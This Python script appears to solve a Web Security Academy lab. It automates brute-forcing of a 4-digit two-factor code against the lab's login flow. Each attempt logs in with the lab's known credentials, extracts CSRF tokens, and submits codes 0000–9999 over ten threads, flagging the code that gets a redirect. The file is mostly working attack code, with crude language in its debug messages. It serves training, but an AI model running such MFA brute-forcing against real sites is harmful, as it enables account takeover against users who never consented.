from libs.Threading import Threading
import requests
import re
import inspect


url = "https://acbf1f781fcafd9a808c4d8600e900d6.web-security-academy.net/"

def print_status(status, file_obj):
    caller_name = inspect.currentframe().f_back.f_code.co_name
    file_obj.write("{}: {}\n".format(caller_name, status))
    if status == 400:
        file_obj.write("I am fucked at: {}\n".format(caller_name))

    return inspect.currentframe().f_back.f_code.co_name

def extract_csrf_token(html_text):
    pattern = "value=\"([a-zA-Z0-9]{32})"
    return re.findall(pattern, html_text)[0]


def login_1_get(file_obj):
    response = requests.get(url + "login")
    print_status(response.status_code, file_obj)
    return response.status_code, extract_csrf_token(response.text), response.cookies


def login_1_post(csrf_token, cookies, file_obj):
    data = f"csrf={csrf_token}&username=carlos&password=montoya"
    response = requests.post(url + "login", cookies=cookies, data=data, allow_redirects=False)
    print_status(response.status_code, file_obj)
    return response.status_code, response.cookies


def login_2_get(cookies, file_obj):
    response = requests.get(url + "login2", cookies=cookies)
    print_status(response.status_code, file_obj)
    return response.status_code, extract_csrf_token(response.text), cookies


def login_2_post(mfa_code, csrf_token, cookies, file_obj):
    data = f"csrf={csrf_token}&mfa-code={mfa_code}"
    response = requests.post(url + "login2", data=data, cookies=cookies, allow_redirects=False)
    status = response.status_code
    print_status(status, file_obj)
    if status == 302:
        print("found it", mfa_code, response.cookies)


def all_steps(mfa_code, file_obj):
    try:
        print(f"- {mfa_code}\n", end="")
        file_obj.write(f"- {mfa_code}\n")
        status, csrf, cookies = login_1_get(file_obj)
        status, cookies = login_1_post(csrf, cookies, file_obj)
        status, csrf, cookies = login_2_get(cookies, file_obj)
        login_2_post(mfa_code, csrf, cookies, file_obj)
    except Exception as e:
        print(f"shit happen {mfa_code}\n", end="")
        print(str(e) + "\n", end="")
        file_obj.write(f"shit happen {mfa_code}\n")
        file_obj.write(str(e) + "\n")
    finally:
        file_obj.flush()


def worker(id, queue, terminator):
    with open(f"logs/{id}.txt", "w") as file:
        file.write(f"thread-{id}\n")
        while not queue.empty() and not terminator.is_exit_now():
            mfa_code = queue.get()
            all_steps(mfa_code, file)

        print(f"thread-{id} stopped\n", end="")


mfa_codes = [format(i, "04d") for i in range(0, 10000)]
thread = Threading(worker, mfa_codes, 10)
thread.start()
thread.join()